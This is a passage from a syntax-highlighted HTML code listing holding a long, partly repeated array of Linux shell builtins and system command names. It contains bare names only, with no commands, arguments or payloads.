class="string">&quot;help&quot;</span>, <span class="string">&quot;history&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;let&quot;</span>, <span class="string">&quot;local&quot;</span>, <span class="string">&quot;logout&quot;</span>, <span class="string">&quot;mapfile&quot;</span>, <span class="string">&quot;popd&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;pushd&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;readarray&quot;</span>, <span class="string">&quot;readonly&quot;</span>, <span class="string">&quot;return&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;shift&quot;</span>, <span class="string">&quot;shopt&quot;</span>, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;suspend&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;times&quot;</span>, <span class="string">&quot;trap&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;typeset&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;unset&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;vipw&quot;</span>, <span class="string">&quot;mkdumprd&quot;</span>, <span class="string">&quot;ifenslave&quot;</span>, <span class="string">&quot;fsck&quot;</span>, <span class="string">&quot;chpasswd&quot;</span>, <span class="string">&quot;useradd&quot;</span>, <span class="string">&quot;rtstat&quot;</span>, <span class="string">&quot;lnstat&quot;</span>, <span class="string">&quot;hwclock&quot;</span>, <span class="string">&quot;dhclient&quot;</span>, <span class="string">&quot;pwunconv&quot;</span>, <span class="string">&quot;groupmems&quot;</span>, <span class="string">&quot;mksquashfs&quot;</span>, <span class="string">&quot;chkconfig&quot;</span>, <span class="string">&quot;ethtool&quot;</span>, <span class="string">&quot;packer&quot;</span>, <span class="string">&quot;mkdict&quot;</span>, <span class="string">&quot;agetty&quot;</span>, <span class="string">&quot;applygnupgdefaults&quot;</span>, <span class="string">&quot;zramctl&quot;</span>, <span class="string">&quot;swaplabel&quot;</span>, <span class="string">&quot;blkzone&quot;</span>, <span class="string">&quot;pwconv&quot;</span>, <span class="string">&quot;cfdisk&quot;</span>, <span class="string">&quot;ldattach&quot;</span>, <span class="string">&quot;reboot&quot;</span>, <span class="string">&quot;tipc&quot;</span>, <span class="string">&quot;fstrim&quot;</span>, <span class="string">&quot;clockdiff&quot;</span>, <span class="string">&quot;groupadd&quot;</span>, <span class="string">&quot;dmfilemapd&quot;</span>, <span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;modinfo&quot;</span>, <span class="string">&quot;swapoff&quot;</span>, <span class="string">&quot;telinit&quot;</span>, <span class="string">&quot;sfdisk&quot;</span>, <span class="string">&quot;ctstat&quot;</span>, <span class="string">&quot;clock&quot;</span>, <span class="string">&quot;rtpr&quot;</span>, <span class="string">&quot;fsfreeze&quot;</span>, <span class="string">&quot;ldconfig&quot;</span>, <span class="string">&quot;fdformat&quot;</span>, <span class="string">&quot;getcap&quot;</span>, <span class="string">&quot;kexec&quot;</span>, <span class="string">&quot;rdma&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;rtmon&quot;</span>, <span class="string">&quot;rtacct&quot;</span>, <span class="string">&quot;fdisk&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;usermod&quot;</span>, <span class="string">&quot;findfs&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="string">&quot;resizepart&quot;</span>, <span class="string">&quot;routef&quot;</span>, <span class="string">&quot;genl&quot;</span>, <span class="string">&quot;mkswap&quot;</span>, <span class="string">&quot;poweroff&quot;</span>, <span class="string">&quot;rdisc&quot;</span>, <span class="string">&quot;grpunconv&quot;</span>, <span class="string">&quot;partx&quot;</span>, <span class="string">&quot;rtcwake&quot;</span>, <span class="string">&quot;nologin&quot;</span>, <span class="string">&quot;rfkill&quot;</span>, <span class="string">&quot;lspci&quot;</span>, <span class="string">&quot;vigr&quot;</span>, <span class="string">&quot;grpconv&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;blkdeactivate&quot;</span>, <span class="string">&quot;addgnupghome&quot;</span>, <span class="string">&quot;chroot&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;unsquashfs&quot;</span>, <span class="string">&quot;readprofile&quot;</span>, <span class="string">&quot;adduser&quot;</span>, <span class="string">&quot;groupmod&quot;</span>, <span class="string">&quot;ss&quot;</span>, <span class="string">&quot;dmstats&quot;</span>, <span class="string">&quot;ifcfg&quot;</span>, <span class="string">&quot;modprobe&quot;</span>, <span class="string">&quot;depmod&quot;</span>, <span class="string">&quot;iconvconfig&quot;</span>, <span class="string">&quot;sulogin&quot;</span>, <span class="string">&quot;rmmod&quot;</span>, <span class="string">&quot;grpck&quot;</span>, <span class="string">&quot;nstat&quot;</span>, <span class="string">&quot;ifstat&quot;</span>, <span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;insmod&quot;</span>, <span class="string">&quot;routel&quot;</span>, <span class="string">&quot;zdump&quot;</span>, <span class="string">&quot;blkdiscard&quot;</span>, <span class="string">&quot;getpcaps&quot;</span>, <span class="string">&quot;losetup&quot;</span>, <span class="string">&quot;setpci&quot;</span>, <span class="string">&quot;dmsetup&quot;</span>, <span class="string">&quot;wipefs&quot;</span>, <span class="string">&quot;addpart&quot;</span>, <span class="string">&quot;zic&quot;</span>, <span class="string">&quot;userdel&quot;</span>, <span class="string">&quot;makedumpfile&quot;</span>, <span class="string">&quot;blkid&quot;</span>, <span class="string">&quot;groupdel&quot;</span>, <span class="string">&quot;setcap&quot;</span>, <span class="string">&quot;chgpasswd&quot;</span>, <span class="string">&quot;resolvconf&quot;</span>, <span class="string">&quot;newusers&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;arping&quot;</span>, <span class="string">&quot;pwck&quot;</span>, <span class="string">&quot;devlink&quot;</span>, <span class="string">&quot;lsmod&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;mkfs&quot;</span>, <span class="string">&quot;faillock&quot;</span>, <span class="string">&quot;runlevel&quot;</span>, <span class="string">&quot;blockdev&quot;</span>, <span class="string">&quot;swapon&quot;</span>, <span class="string">&quot;alternatives&quot;</span>, <span class="string">&quot;arpd&quot;</span>, <span class="string">&quot;delpart&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;chcpu&quot;</span>, <span class="string">&quot;capsh&quot;</span>, <span class="string">&quot;ctrlaltdel&quot;</span>, <span class="string">&quot;bridge&quot;</span>, <span class="string">&quot;less&quot;</span>, <span class="string">&quot;gpgsplit&quot;</span>, <span class="string">&quot;pgrep&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;localedef&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;gencat&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;ptx&quot;</span>, <span class="string">&quot;nm&quot;</span>, <span class="string">&quot;pwmake&quot;</span>, <span class="string">&quot;zmore&quot;</span>, <span class="string">&quot;tzselect&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dnsdomainname&quot;</span>, <span class="string">&quot;ar&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;journalctl&quot;</span>, <span class="string">&quot;gunzip&quot;</span>, <span class="string">&quot;makedb&quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;col&quot;</span>, <span class="string">&quot;sync&quot;</span>, <span class="string">&quot;vi&quot;</span>, <span class="string">&quot;locale&quot;</span>, <span class="string">&quot;prlimit&quot;</span>, <span class="string">&quot;nisdomainname&quot;</span>, <span class="string">&quot;timedatectl&quot;</span>, <span class="string">&quot;ipcmk&quot;</span>, <span class="string">&quot;isosize&quot;</span>, <span class="string">&quot;free&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;taskset&quot;</span>, <span class="string">&quot;factor&quot;</span>, <span class="string">&quot;pinky&quot;</span>, <span class="string">&quot;arch&quot;</span>, <span class="string">&quot;lscpu&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;tty&quot;</span>, <span class="string">&quot;xmllint&quot;</span>, <span class="string">&quot;xzcmp&quot;</span>, <span class="string">&quot;readelf&quot;</span>, <span class="string">&quot;kdumpctl&quot;</span>, <span class="string">&quot;tsort&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;cal&quot;</span>, <span class="string">&quot;rpmdb&quot;</span>, <span class="string">&quot;newgrp&quot;</span>, <span class="string">&quot;xmlwf&quot;</span>, <span class="string">&quot;slabtop&quot;</span>, <span class="string">&quot;utmpdump&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;basename&quot;</span>, <span class="string">&quot;eject&quot;</span>, <span class="string">&quot;ranlib&quot;</span>, <span class="string">&quot;wall&quot;</span>, <span class="string">&quot;zless&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;nsenter&quot;</span>, <span class="string">&quot;getent&quot;</span>, <span class="string">&quot;chrt&quot;</span>, <span class="string">&quot;mount&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;systemctl&quot;</span>, <span class="string">&quot;vmstat&quot;</span>, <span class="string">&quot;xmlcatalog&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;lsinitrd&quot;</span>, <span class="string">&quot;tload&quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;setsid&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;colcrt&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;lsipc&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;lsns&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;lastb&quot;</span>, <span class="string">&quot;df&quot;</span>, <span class="string">&quot;gpg&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;gpgv&quot;</span>, <span class="string">&quot;pathchk&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;lsmem&quot;</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;as&quot;</span>, <span class="string">&quot;ipcs&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;iconv&quot;</span>, <span class="string">&quot;dwp&quot;</span>, <span class="string">&quot;domainname&quot;</span>, <span class="string">&quot;xzcat&quot;</span>, <span class="string">&quot;ldd&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;dircolors&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;trust&quot;</span>, <span class="string">&quot;stty&quot;</span>, <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;chacl&quot;</span>, <span class="string">&quot;loginctl&quot;</span>, <span class="string">&quot;gzip&quot;</span>, <span class="string">&quot;xzmore&quot;</span>, <span class="string">&quot;zcat&quot;</span>, <span class="string">&quot;busctl&quot;</span>, <span class="string">&quot;fincore&quot;</span>, <span class="string">&quot;fgrep&quot;</span>, <span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;lslogins&quot;</span>, <span class="string">&quot;numfmt&quot;</span>, <span class="string">&quot;flock&quot;</span>, <span class="string">&quot;realpath&quot;</span>, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;lesskey&quot;</span>, <span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;du&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;tee&quot;</span>, <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;gawk&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;sg&quot;</span>, <span class="string">&quot;xzegrep&quot;</span>, <span class="string">&quot;xzdec&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;whereis&quot;</span>, <span class="string">&quot;strings&quot;</span>, <span class="string">&quot;setfacl&quot;</span>, <span class="string">&quot;mkfifo&quot;</span>, <span class="string">&quot;chage&quot;</span>, <span class="string">&quot;xzgrep&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;rvi&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;ypdomainname&quot;</span>, <span class="string">&quot;tr&quot;</span>, <span class="string">&quot;umount&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;wdctl&quot;</span>, <span class="string">&quot;uniq&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;stdbuf&quot;</span>, <span class="string">&quot;chgrp&quot;</span>, <span class="string">&quot;setarch&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;dirmngr&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;lastlog&quot;</span>, <span class="string">&quot;gsettings&quot;</span>, <span class="string">&quot;ex&quot;</span>, <span class="string">&quot;ipcrm&quot;</span>, <span class="string">&quot;cp&quot;</span>, <span class="string">&quot;fallocate&quot;</span>, <span class="string">&quot;colrm&quot;</span>, <span class="string">&quot;rpm&quot;</span>, <span class="string">&quot;pwdx&quot;</span>, <span class="string">&quot;xargs&quot;</span>, <span class="string">&quot;objdump&quot;</span>, <span class="string">&quot;ld&quot;</span>, <span class="string">&quot;chcon&quot;</span>, <span class="string">&quot;skill&quot;</span>, <span class="string">&quot;yum&quot;</span>, <span class="string">&quot;who&quot;</span>, <span class="string">&quot;gapplication&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;uuidgen&quot;</span>, <span class="string">&quot;logger&quot;</span>, <span class="string">&quot;pwscore&quot;</span>, <span class="string">&quot;xz&quot;</span>, <span class="string">&quot;mesg&quot;</span>, <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;zgrep&quot;</span>, <span class="string">&quot;chmem&quot;</span>, <span class="string">&quot;newuidmap&quot;</span>, <span class="string">&quot;evmctl&quot;</span>, <span class="string">&quot;wc&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;egrep&quot;</span>, <span class="string">&quot;fold&quot;</span>, <span class="string">&quot;zfgrep&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;csplit&quot;</span>, <span class="string">&quot;sum&quot;</span>, <span class="string">&quot;expand&quot;</span>, <span class="string">&quot;getfacl&quot;</span>, <span class="string">&quot;newgidmap&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;bootctl&quot;</span>, <span class="string">&quot;xzless&quot;</span>, <span class="string">&quot;runcon&quot;</span>, <span class="string">&quot;dirname&quot;</span>, <span class="string">&quot;comm&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hostname&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;ipcalc&quot;</span>, <span class="string">&quot;unexpand&quot;</span>, <span class="string">&quot;nohup&quot;</span>, <span class="string">&quot;zegrep&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;getopt&quot;</span>, <span class="string">&quot;raw&quot;</span>, <span class="string">&quot;hexdump&quot;</span>, <span class="string">&quot;mountpoint&quot;</span>, <span class="string">&quot;lslocks&quot;</span>, <span class="string">&quot;coreutils&quot;</span>, <span class="string">&quot;shred&quot;</span>, <span class="string">&quot;sotruss&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;pldd&quot;</span>, <span class="string">&quot;uuidparse&quot;</span>, <span class="string">&quot;localectl&quot;</span>, <span class="string">&quot;gtar&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;znew&quot;</span>, <span class="string">&quot;logname&quot;</span>, <span class="string">&quot;gzexe&quot;</span>, <span class="string">&quot;rpmquery&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;cpio&quot;</span>, <span class="string">&quot;sprof&quot;</span>, <span class="string">&quot;hostnamectl&quot;</span>, <span class="string">&quot;uname&quot;</span>, <span class="string">&quot;unxz&quot;</span>, <span class="string">&quot;zdiff&quot;</span>, <span class="string">&quot;gdbus&quot;</span>, <span class="string">&quot;namei&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;kmod&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;zcmp&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;mktemp&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;column&quot;</span>, <span class="string">&quot;scriptreplay&quot;</span>, <span class="string">&quot;lessecho&quot;</span>, <span class="string">&quot;look&quot;</span>, <span class="string">&quot;setterm&quot;</span>, <span class="string">&quot;gdbmtool&quot;</span>, <span class="string">&quot;rpmkeys&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;gpasswd&quot;</span>, <span class="string">&quot;dracut&quot;</span>, <span class="string">&quot;vdir&quot;</span>, <span class="string">&quot;mcookie&quot;</span>, <span class="string">&quot;elfedit&quot;</span>, <span class="string">&quot;chown&quot;</span>, <span class="string">&quot;objcopy&quot;</span>, <span class="string">&quot;hostid&quot;</span>, <span class="string">&quot;shuf&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;gpgparsemail&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;zforce&quot;</span>, <span class="string">&quot;last&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;ionice&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;resolvectl&quot;</span>, <span class="string">&quot;watchgnupg&quot;</span>, <span class="string">&quot;unshare&quot;</span>, <span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;getconf&quot;</span>, <span class="string">&quot;findmnt&quot;</span>, <span class="string">&quot;pr&quot;</span>, <span class="string">&quot;xzfgrep&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;rview&quot;</span>, <span class="string">&quot;fmt&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;paste&quot;</span>, <span class="string">&quot;od&quot;</span>, <span class="string">&quot;setpriv&quot;</span>, <span class="string">&quot;coredumpctl&quot;</span>, <span class="string">&quot;dnf&quot;</span>, <span class="string">&quot;xzdiff&quot;</span>, <span class="string">&quot;renicerpmverify&quot;</span>, <span class="string">&quot;pkill&quot;</span>, <span class="string">&quot;mkinitrd&quot;</span>, <span class="string">&quot;pmap&quot;</span>, <span class="string">&quot;snice&quot;</span>, <span class="string">&quot;gio&quot;</span>, <span class="string">&quot;gpgconf&quot;</span>, <span class="string">&quot;expr&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;nproc&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;cksum&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;rpmverify&quot;</span>, <span class="string">&quot;lsblk&quot;</span>, <span class="string">&quot;catchsegv&quot;</span>, <span class="string">&quot;uptime&quot;</span>, <span class="string">&quot;seq&quot;</span>, <span class="string">&quot;ln&quot;</span>, <span class="string">&quot;cut&quot;</span>, <span class="string">&quot;bashbug&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;gprof&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;npm&quot;</span>, <span class="string">&quot;corepack&quot;</span>, <span class="string">&quot;npx&quot;</span>, <span class="string">&quot;vipw&quot;</span>, <span class="string">&quot;mkdumprd&quot;</span>, <span class="string">&quot;ifenslave&quot;</span>, <span class="string">&quot;fsck&quot;</span>, <span class="string">&quot;chpasswd&quot;</span>, <span class="string">&quot;useradd&quot;</span>, <span class="string">&quot;rtstat&quot;</span>, <span class="string">&quot;lnstat&quot;</span>, <span class="string">&quot;hwclock&quot;</span>, <span class="string">&quot;dhclient&quot;</span>, <span class="string">&quot;pwunconv&quot;</span>, <span class="string">&quot;groupmems&quot;</span>, <span class="string">&quot;mksquashfs&quot;</span>, <span class="string">&quot;chkconfig&quot;</span>, <span class="string">&quot;ethtool&quot;</span>, <span class="string">&quot;packer&quot;</span>, <span class="string">&quot;mkdict&quot;</span>, <span class="string">&quot;agetty&quot;</span>, <span class="string">&quot;applygnupgdefaults&quot;</span>, <span class="string">&quot;zramctl&quot;</span>, <span class="string">&quot;swaplabel&quot;</span>, <span class="string">&quot;blkzone&quot;</span>, <span class="string">&quot;pwconv&quot;</span>, <span class="string">&quot;cfdisk&quot;</span>, <span class="string">&quot;ldattach&quot;</span>, <span class="string">&quot;reboot&quot;</span>, <span class="string">&quot;tipc&quot;</span>, <span class="string">&quot;fstrim&quot;</span>, <span class="string">&quot;clockdiff&quot;</span>, <span class="string">&quot;groupadd&quot;</span>, <span class="string">&quot;dmfilemapd&quot;</span>, <span class="string">&quot;runuser&quot;</span>, <span class="string">&quot;modinfo&quot;</span>, <span class="string">&quot;swapoff&quot;</span>, <span class="string">&quot;telinit&quot;</span>, <span class="string">&quot;sfdisk&quot;</span>, <span class="string">&quot;ctstat&quot;</span>, <span class="string">&quot;clock&quot;</span>, <span class="string">&quot;rtpr&quot;</span>, <span class="string">&quot;fsfreeze&quot;</span>, <span class="string">&quot;ldconfig&quot;</span>, <span class="string">&quot;fdformat&quot;</span>, <span class="string">&quot;getcap&quot;</span>, <span class="string">&quot;kexec&quot;</span>, <span class="string">&quot;rdma&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;rtmon&quot;</span>, <span class="string">&quot;rtacct&quot;</span>, <span class="string">&quot;fdisk&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;usermod&quot;</span>, <span class="string">&quot;findfs&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="string">&quot;resizepart&quot;</span>, <span class="string">&quot;routef&quot;</span>, <span class="string">&quot;genl&quot;</span>, <span class="string">&quot;mkswap&quot;</span>, <span class="string">&quot;poweroff&quot;</span>, <span class="string">&quot;rdisc&quot;</span>, <span class="string">&quot;grpunconv&quot;</span>, <span class="string">&quot;partx&quot;</span>, <span class="string">&quot;rtcwake&quot;</span>, <span class="string">&quot;nologin&quot;</span>, <span class="string">&quot;rfkill&quot;</span>, <span class="string">&quot;lspci&quot;</span>, <span class="string">&quot;vigr&quot;</span>, <span class="string">&quot;grpconv&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;blkdeactivate&quot;</span>, <span class="string">&quot;addgnupghome&quot;</span>, <span class="string">&quot;chroot&quot;</span>, <span class="string">&quot;shutdown&quot;</span>, <span class="string">&quot;unsquashfs&quot;</span>, <span class="string">&quot;readprofile&quot;</span>, <span class="string">&quot;adduser&quot;</span>, <span class="string">&quot;groupmod&quot;</span>, <span class="string">&quot;ss&quot;</span>, <span class="string">&quot;dmstats&quot;</span>, <span class="string">&quot;ifcfg&quot;</span>, <span class="string">&quot;modprobe&quot;</span>, <span class="string">&quot;depmod&quot;</span>, <span class="string">&quot;iconvconfig&quot;</span>, <span class="string">&quot;sulogin&quot;</span>, <span class="string">&quot;rmmod&quot;</span>, <span class="string">&quot;grpck&quot;</span>, <span class="string">&quot;nstat&quot;</span>, <span class="string">&quot;ifstat&quot;</span>, <span class="string">&quot;sysctl&quot;</span>, <span class="string">&quot;insmod&quot;</span>, <span class="string">&quot;routel&quot;</span>, <span class="string">&quot;zdump&quot;</span>, <span class="string">&quot;blkdiscard&quot;</span>, <span class="string">&quot;getpcaps&quot;</span>, <span class="string">&quot;losetup&quot;</span>, <span class="string">&quot;setpci&quot;</span>, <span class="string">&quot;dmsetup&quot;</span>, <span class="string">&quot;wipefs&quot;</span>, <span class="string">&quot;addpart&quot;</span>, <span class="string">&quot;zic&quot;</span>, <span class="string">&quot;userdel&quot;</span>, <span class="string">&quot;makedumpfile&quot;</span>, <span class="string">&quot;blkid&quot;</span>, <span class="string">&quot;groupdel&quot;</span>, <span class="string">&quot;setcap&quot;</span>, <span class="string">&quot;chgpasswd&quot;</span>, <span class="string">&quot;resolvconf&quot;</span>, <span class="string">&quot;newusers&quot;</span>, <span class="string">&quot;init&quot;</span>, <span class="string">&quot;arping&quot;</span>, <span class="string">&quot;pwck&quot;</span>, <span class="string">&quot;devlink&quot;</span>, <span class="string">&quot;lsmod&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;mkfs&quot;</span>, <span class="string">&quot;faillock&quot;</span>, <span class="string">&quot;runlevel&quot;</span>, <span class="string">&quot;blockdev&quot;</span>, <span class="string">&quot;swapon&quot;</span>, <span class="string">&quot;alternatives&quot;</span>, <span class="string">&quot;arpd&quot;</span>, <span class="string">&quot;delpart&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;chcpu&quot;</span>, <span class="string">&quot;capsh&quot;</span>, <span class="string">&quot;ctrlaltdel&quot;</span>, <span class="string">&quot;bridge&quot;</span>, <span class="string">&quot;less&quot;</span>, <span class="string">&quot;gpgsplit&quot;</span>, <span class="string">&quot;pgrep&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;localedef&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;gencat&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;ptx&quot;</span>, <span class="string">&quot;nm&quot;</span>, <span class="string">&quot;pwmake&quot;</span>, <span class="string">&quot;zmore&quot;</span>, <span class="string">&quot;tzselect&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dnsdomainname&quot;</span>, <span class="string">&quot;ar&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;journalctl&quot;</span>, <span class="string">&quot;gunzip&quot;</span>, <span class="string">&quot;makedb&quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;col&quot;</span>, <span class="string">&quot;sync&quot;</span>, <span class="string">&quot;vi&quot;</span>, <span class="string">&quot;locale&quot;</span>, <span class="string">&quot;prlimit&quot;</span>, <span class="string">&quot;nisdomainname&quot;</span>, <span class="string">&quot;timedatectl&quot;</span>, <span class="string">&quot;ipcmk&quot;</span>, <span class="string">&quot;isosize&quot;</span>, <span class="string">&quot;free&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;taskset&quot;</span>, <span class="string">&quot;factor&quot;</span>, <span class="string">&quot;pinky&quot;</span>, <span class="string">&quot;arch&quot;</span>, <span class="string">&quot;lscpu&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;tty&quot;</span>, <span class="string">&quot;xmllint&quot;</span>, <span class="string">&quot;xzcmp&quot;</span>, <span class="string">&quot;readelf&quot;</span>, <span class="string">&quot;kdumpctl&quot;</span>, <span class="string">&quot;tsort&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;cal&quot;</span>, <span class="string">&quot;rpmdb&quot;</span>, <span class="string">&quot;newgrp&quot;</span>, <span class="string">&quot;xmlwf&quot;</span>, <span class="string">&quot;slabtop&quot;</span>, <span class="string">&quot;utmpdump&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;basename&quot;</span>, <span class="string">&quot;eject&quot;</span>, <span class="string">&quot;ranlib&quot;</span>, <span class="string">&quot;wall&quot;</span>, <span class="string">&quot;zless&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;nsenter&quot;</span>, <span class="string">&quot;getent&quot;</span>, <span class="string">&quot;chrt&quot;</span>, <span class="string">&quot;mount&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;systemctl&quot;</span>, <span class="string">&quot;vmstat&quot;</span>, <span class="string">&quot;xmlcatalog&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;lsinitrd&quot;</span>, <span class="string">&quot;tload&quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;setsid&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;colcrt&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;lsipc&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;lsns&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;lastb&quot;</span>, <span class="string">&quot;df&quot;</span>, <span class="string">&quot;gpg&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;gpgv&quot;</span>, <span class="string">&quot;pathchk&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;lsmem&quot;</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;as&quot;</span>, <span class="string">&quot;ipcs&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;iconv&quot;</span>, <span class="string">&quot;dwp&quot;</span>, <span class="string">&quot;domainname&quot;</span>, <span class="string">&quot;xzcat&quot;</span>, <span 